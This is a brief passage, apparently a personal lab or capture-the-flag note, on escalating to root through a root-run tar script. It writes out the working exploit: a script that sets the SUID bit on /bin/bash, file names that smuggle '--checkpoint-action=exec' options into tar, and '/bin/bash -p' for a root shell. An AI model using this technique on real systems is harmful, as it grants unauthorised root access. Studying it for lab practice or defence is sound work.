was a script running as root that was getting all files from the "user" directory so when I ran this

add to directory getting tar and run by root 

        printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
        echo "" > "--checkpoint-action=exec=sh shell.sh"
        echo "" > --checkpoint=1

it added to the directory and when the root ran the script again I was able to run 

run in terminal after files below have been exicuted

	/bin/bash -p

and then gain root privaleges ************************************
